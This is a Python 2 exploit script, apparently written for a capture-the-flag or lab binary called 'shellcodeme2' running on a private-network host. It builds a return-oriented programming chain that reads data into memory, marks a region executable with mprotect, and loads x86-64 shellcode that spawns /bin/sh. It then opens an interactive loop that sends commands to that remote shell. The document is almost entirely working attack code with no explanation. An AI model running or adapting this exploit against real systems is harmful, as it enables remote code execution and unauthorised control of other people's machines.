#!/usr/bin/env python
from struct import *
import sys
import socket
from time import sleep

rhp     = ("192.168.75.132",4296)

addr_ret        = 0x0040062c
addr_pop_rsi_1  = 0x00400691
addr_pop_rdi    = 0x00400693
addr_pop_1      = 0x00400692
addr_mov_rdx    = 0x00400670    #mov r13,rdx    callq *(%r12,%rbx,8)
addr_pop_6      = 0x0040068a    #pop rbx,rbp,r12,r13,r14,r15
addr_mprotect   = 0x004004c0
addr_read       = 0x00400490
addr_mem_exec   = 0x20000000

addr_buf        = 0x00601100

stdin  = 0x0
length = 0x400

#==========
nc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
nc.settimeout(0.5)
nc.connect(rhp)

exploit =   pack("<Q", addr_ret)
exploit +=  "\x00"*0x8

exploit +=  pack("<Q", addr_pop_rdi)
exploit +=  pack("<Q", stdin)
exploit +=  pack("<Q", addr_pop_rsi_1)
exploit +=  pack("<Q", addr_buf)
exploit +=  pack("<Q", 0xdeadbeef)
exploit +=  pack("<Q", addr_read)

exploit +=  pack("<Q", addr_pop_6)
exploit +=  pack("<Q", 0x0)
exploit +=  pack("<Q", 0x0)
exploit +=  pack("<Q", addr_buf)
exploit +=  pack("<Q", 0x7)
exploit +=  pack("<Q", 0x0)
exploit +=  pack("<Q", 0x0)
exploit +=  pack("<Q", addr_mov_rdx)

exploit +=  pack("<Q", addr_pop_rdi)
exploit +=  pack("<Q", addr_mem_exec)
exploit +=  pack("<Q", addr_pop_rsi_1)
exploit +=  pack("<Q", length)
exploit +=  pack("<Q", 0xdeadbeef)
exploit +=  pack("<Q", addr_mprotect)

exploit +=  pack("<Q", addr_pop_6)
exploit +=  pack("<Q", 0x0)
exploit +=  pack("<Q", 0x0)
exploit +=  pack("<Q", addr_buf)
exploit +=  pack("<Q", length)
exploit +=  pack("<Q", 0x0)
exploit +=  pack("<Q", 0x0)
exploit +=  pack("<Q", addr_mov_rdx)

exploit +=  pack("<Q", addr_pop_rdi)
exploit +=  pack("<Q", stdin)
exploit +=  pack("<Q", addr_pop_rsi_1)
exploit +=  pack("<Q", addr_mem_exec)
exploit +=  pack("<Q", 0xdeadbeef)
exploit +=  pack("<Q", addr_read)

exploit +=  pack("<Q", addr_mem_exec)


payload =   "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  #movabs '/bin/sh',%rbx
payload +=  "\x53"                                      #push   %rbx
payload +=  "\x48\x89\xe7"                              #mov    %rsp,%rdi
payload +=  "\x48\x31\xf6"                              #xor    %rsi,%rsi
payload +=  "\x48\x31\xd2"                              #xor    %rdx,%rdx
payload +=  "\x48\x31\xc0"                              #xor    %rax,%rax
payload +=  "\xb0\x3b"                                  #mov    0x3b,%al
payload +=  "\x0f\x05"                                  #syscall

#open('exploit','wb').write(exploit)
#open('address','wb').write(pack("<Q", addr_pop_1))
#open('payload','wb').write(payload)

#nc.sendall('(cat exploit; sleep 1; cat address; sleep 1; cat payload; cat) | ./shellcodeme2\x0a')
nc.sendall('./shellcodeme2\x0a')
sleep(1)
nc.sendall(exploit+'\x0a')
sleep(1)
nc.sendall(pack("<Q", addr_pop_1)+'\x0a')
sleep(1)
nc.sendall(payload+'\x0a')

#==========
while True:
    cmd = raw_input("$")
    if len(cmd)>0:
        nc.sendall(cmd + "\x0a")

    if cmd!="exit":
        rsp = ""
        try:
            while len(rsp)%1024==0:
                rsp += nc.recv(1024)
        except:
            rsp += "Response Timeout"
        finally:
            print rsp
    else:
        break

nc.close()
#==========
